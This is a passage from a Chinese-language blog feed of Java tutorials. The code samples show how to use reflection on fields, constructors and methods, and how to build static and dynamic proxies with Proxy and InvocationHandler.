<span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, a=&#x27;&quot;</span> + a + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃饭&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;打篮球&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> personClass.getField(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> a.get(person);<br>        System.out.println(o);<br>        a.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当然也可以获取<code>private</code>属性的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> personClass.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> name.get(person);<br>        System.out.println(o);<br>        name.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里就不一一演示了。</p><h4 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h4><ul><li>Constructor[] getConstructors()</li><li>Constructor getConstructor(类 &lt;?&gt; … parameterTypes)</li><li>Constructor getDeclaredConstructors()</li><li>Constructor getDeclaredConstructor(类 &lt;?&gt; … parameterTypes)</li></ul><p><strong>记得给Person添加构造方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoConstruct</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;xsw6a&quot;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&quot;harworking&quot;</span>);<br>        System.out.println(o);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<span class="hljs-comment">//每一个构造方法的参数种类不一样，这一步是获取构造方法</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252200686.png" alt="QQ截图20220225220052"></p><p>如果是无参构造方法，可以直接使用Class类对象的newInstance方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> personClass.newInstance();<br>System.out.println(o);<br></code></pre></td></tr></table></figure><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul><li><p>Method[] getMethods()&#x2F;&#x2F;获取所有【public】修饰的方法，父类Object的方法也能看到</p></li><li><p>Method getMethod(String name，类 &lt;?&gt; … parameterTypes)</p></li><li><p>Method[] getDeclaredMethods()&#x2F;&#x2F;获取所有声明方法 不考虑修饰符 不考虑继承的方法</p></li><li><p>Method getDeclaredMethod(String name，类 &lt;?&gt; … parameterTypes) 不考虑修饰符 不考虑继承的方法</p><p><strong>无参数类型。</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eat&quot;</span>);<span class="hljs-comment">//获取制定名称的方法</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//进而执行方法,【invoke】，它需要一个真实的对象，以及方法的实际参数列表</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">pp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-comment">//因为是空参方法，所以直接放进来一个对象就行</span><br>        <span class="hljs-comment">//执行方法，eat...</span><br>        eat.invoke(person);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>有参数类型</strong>（记得改person类）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218476.png" alt="QQ截图20220225221351"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethodTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eatCan&quot;</span>, String.class);<span class="hljs-comment">//eat方法重载，eat方法的需要传入的参数是String类型</span><br>        eat.invoke(person,<span class="hljs-string">&quot;水果&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>不一一实现。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java两种代理</title>
    <link href="/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/"/>
    <url>/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Java代理"><a href="#Java代理" class="headerlink" title="Java代理"></a>Java代理</h1><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>为不修改原先的类，而创建代理类去修改。</p><h3 id="用户接口"><a href="#用户接口" class="headerlink" title="用户接口"></a>用户接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServices</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="实现类"><a href="#实现类" class="headerlink" title="实现类"></a>实现类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.sql.SQLOutput;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;更新&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="代理类"><a href="#代理类" class="headerlink" title="代理类"></a>代理类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRealProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span> &#123;<br>    <span class="hljs-keyword">private</span> UserServices userServices; <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserRealProxy</span><span class="hljs-params">(UserServices userServices)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userServices = userServices;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        before();<br>        userServices.select();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        before();<br>        userServices.update();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;在这之前&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;在这之后&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>值得注意的点：</p><p>1、这里的<code>private UserServices userServices;</code>目的是规范话<code>userServices</code></p><p>2、构造函数，为了传入代理类。</p><h3 id="实现类-1"><a href="#实现类-1" class="headerlink" title="实现类"></a>实现类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServices</span> <span class="hljs-variable">userReal</span> <span class="hljs-operator">=</span> (UserServices) <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserReal</span>();<br>        <span class="hljs-type">UserRealProxy</span> <span class="hljs-variable">userRealProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRealProxy</span>(userReal);<br>        userRealProxy.select();<br>        userRealProxy.update();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045862.png" alt="QQ截图20220225145647"></p><p>代理类实现了不修改源代码而改变了输出结果（添加了在这之前与之后）。</p><p>但是实际应用中用到的静态代理很少很少。因为：</p><p>1、当需要代理多个类的时候，由于代理对象要实现与目标对象一致的接口，有两种方式：</p><ul><li>只维护一个代理类，由这个代理类实现多个接口，但是这样就导致<strong>代理类过于庞大</strong></li><li>新建多个代理类，每个目标对象对应一个代理类，但是这样会<strong>产生过多的代理类</strong></li></ul><p>2、当接口需要增加、删除、修改方法的时候，目标对象与代理类都要同时修改，<strong>不易维护</strong>。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>首先要了解一个类和一个接口：</p><ul><li><code>java.lang.reflect.Proxy</code>（类）</li><li><code>java.lang.reflect.InvocationHandler</code>（接口）</li></ul><p><code>java.lang.reflect.Proxy</code>主要用于生成动态代理类Class、创建代理类实例，该类实现了<code>java.io.Serializable</code>接口。</p><p><strong>Proxy</strong>：是所有动态代理的父类，负责new一个实例。<br><strong>InvocationHandler</strong>：用于调用<code>Proxy</code>类生成的代理类方法，该类只有一个<code>Invoke</code>方法（代理对象要执行的功能代码）。并且每一个类都要实现<code>IncocationHandler</code>这个接口。</p><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>快捷键Ctrl+shift+f，搜索<code>public class Proxy implements java.io.Serializable</code>可找到该类。这里引用别的师傅的翻译。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">copypackage java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br><br>  <span class="hljs-comment">// 省去成员变量和部分类方法...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取动态代理处理类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy 返回调用处理程序的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理实例的调用处理程序</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title function_">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类实例</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组，这里的对象是接口实现类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     定义代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 代理类要实现的接口列表</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 检测某个类是否是动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl 要测试的类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> &#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 向指定的类加载器中定义一个类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader 类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   类名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      类字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    截取开始位置</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    截取长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVM创建的类Class对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title function_">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>用的最多的就是<code>newProxyInstance()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * 创建动态代理类实例</span><br><span class="hljs-comment">  *</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组，这里的对象是接口实现类</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">  */</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>         <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>     ...<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="Invocationhandler"><a href="#Invocationhandler" class="headerlink" title="Invocationhandler"></a>Invocationhandler</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045587.png" alt="QQ截图20220225191721"></p><p>其中参数</p><p><code>proxy</code>：jdk创建的代理对象，无需赋值</p><p><code>method</code>：目标类中的方法</p><p><code>args参数</code>：目标类中的方法所接收的参数。<br>并且这三个参数都是jdk自带的！！</p><p>如何使用这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object demo;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">(Object demo)</span> &#123;<br>        <span class="hljs-built_in">this</span>.demo = demo;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;开始&quot;</span>);<br>       Object res=  method.invoke(demo, args);<br>        System.out.println(<span class="hljs-string">&quot;结束&quot;</span>);<br>        <span class="hljs-keyword">return</span> res;<br>    